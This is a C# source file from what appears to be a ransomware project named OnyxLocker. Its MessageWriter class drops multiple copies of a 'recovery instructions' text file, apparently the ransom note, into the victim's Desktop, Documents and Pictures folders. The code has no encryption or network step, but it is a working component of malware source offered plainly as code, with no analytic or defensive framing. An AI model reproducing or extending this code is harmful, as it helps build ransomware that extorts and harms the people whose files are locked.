using System;
using System.IO;

namespace OnyxLocker.Classes
{
    internal class MessageWriter
    {
        private string Message { get; }
        private string FileName { get; }
        private int MessageCount { get; }

        /// <summary>
        /// Provides function to write the recovery instructions to a few set location
        /// </summary>
        /// <param name="message">Recovery instructions</param>
        /// <param name="fileName">Base filename</param>
        /// <param name="messageCount">Message count</param>
        public MessageWriter(string message, string fileName, int messageCount)
        {
            Message = message;
            FileName = fileName;
            MessageCount = messageCount;
        }

        /// <summary>
        /// Writes the given message to the desktop
        /// </summary>
        public void WriteMessageToDesktop()
        {
            var folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            WriteMessages(folderPath, Message, MessageCount, FileName);
        }

        public void WriteMessageToDocuments()
        {
            var folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            WriteMessages(folderPath, Message, MessageCount, FileName);
        }

        public void WriteMessageToPictures()
        {
            var folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures);
            WriteMessages(folderPath, Message, MessageCount, FileName);
        }

        private void WriteMessages(string folderPath, string message, int messageCount, string fileName)
        {
            StreamWriter sw;
            FileStream fs;
            for (int i = 0; i < messageCount; i++)
            {
                var fname = $"{fileName} {i} .txt";
                var filePath = Path.Combine(folderPath, fname);

                using (fs = new FileStream(filePath, FileMode.OpenOrCreate))
                {
                    using (sw = new StreamWriter(fs))
                    {
                        sw.WriteLine(message);
                    }
                }
            }
        }
    }
}